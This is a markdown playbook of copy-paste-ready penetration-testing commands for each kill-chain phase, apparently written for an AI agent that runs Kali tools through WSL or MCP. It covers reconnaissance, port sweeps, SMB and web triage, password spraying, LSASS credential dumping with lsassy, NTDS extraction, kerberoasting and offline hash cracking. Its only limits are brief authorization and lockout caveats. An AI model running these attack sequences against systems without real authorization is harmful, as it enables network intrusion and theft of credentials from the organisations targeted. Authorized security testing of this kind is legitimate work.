# Phase Playbooks — Exact Commands

Copy-paste-ready command sequences for each kill-chain phase. Run Kali tools via:
`wsl -d kali-linux -- bash -lc "<cmd>"` or MCP `kali_<tool>`.

---

## Phase 1 — External Attack Surface

```bash
# Passive first
whois -h whois.internic.net target.com
dig +short target.com MX; dig +short target.com NS; dig +short target.com TXT

# Subdomain enum (passive sources)
subfinder -d target.com -silent -all -o subfinder.txt
amass enum -passive -d target.com -o amass.txt
dnsx -l subfinder.txt -a -resp -o dns_resolved.txt

# Live host discovery + tech
httpx -l dns_resolved.txt -status-code -tech-detect -title -o live_hosts.txt
```

Save everything. Deduplicate. Match discovered names against scope before Phase 2.

## Phase 2 — Port & Service Mapping

```bash
# 1) Fast full-port sweep per IP
masscan <ip> -p1-65535 --rate=2000 -oG masscan.gnmap

# 2) Parse open ports, then precision nmap
grep 'open' masscan.gnmap | cut -d' ' -f7 | tr '[:upper:]' '[:lower:]' > open_ports.txt
nmap -sV -Pn -p <ports> --scripts='(discovery or vulners) and not intrusive' <ip>

# 3) quick win checks
nmap -sV --script smb-vuln-ms17-010 445 <ip>
nmap --script http-title,http-headers,http-methods -p80,443,8000-9000 <ip>
```

## Phase 3 — Service Triage

### SMB
```bash
enum4linux-ng -A <ip> -oY tmp.json
netexec smb <ip> -u '' -p '' --shares            # anonymous
netexec smb <ip> -u users -p 'Passw0rd!'         # spray (max 1 pw/cycle)
netexec smb <ip> -u guest -p '' -M lsassy        # if creds
nmap --script 'smb-*' -p445 <ip>
```

### HTTP
```bash
whatweb -a 3 http://<ip>:<port>
nikto -hhttp://<ip>:<port> -Format htm -o nikto.<port>.html
nuclei -u http://<ip>:<port> -severity critical,high -t cves -t exposures
dirsearch -u http://<ip>:<port> -e php,html,bak,old -t 10
```

### SSH
```bash
ssh-audit <ip>
```
Flag: SHA1/None cipher, v1 protocol, outdated OpenSSH.

### SMTP
```bash
nmap --script smtp-enum-users,smtp-open-relay -p25 <ip>
```

### DB
```bash
nmap --script 'mysql-*' -p3306 <ip>
nmap --script pgsql-brute -p5432 <ip>          # only w/ authorization
```

## Phase 4 — Credential Access

```bash
# user enumeration first
netexec smb <ip> -u users.txt -p '' --users
# spray calendar passwords (1 per cycle, honor lockout)
netexec smb <ip> -u users.txt -p 'Summer2025!' --continue-on-success
# offline hash crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 18200 kerb.txt /usr/share/wordlists/rockyou.txt
```

## Phase 5 — Exploit Routing

```bash
searchsploit apache 2.4.53 --json
searchsploit openssh 7.4 --json
```
Escalate according to matched exploit; NEVER destroy/degrade service. Interactive platforms (msf) need explicit user approval before firing an exploit with side effects.

## Phase 6 — Internal Pivot (if creds)

```bash
# after obtaining valid creds
netexec smb <dc_ip> -u user -p pass --ntds drsuapi    # if admin
bloodhound-python -dc <dc> -u user -p pass -d <domain>
# kerberoast
netexec ldap <dc_ip> -u user -p pass --kerberoasting output.txt
```
Route deeper pivots into `offensive-active-directory`.
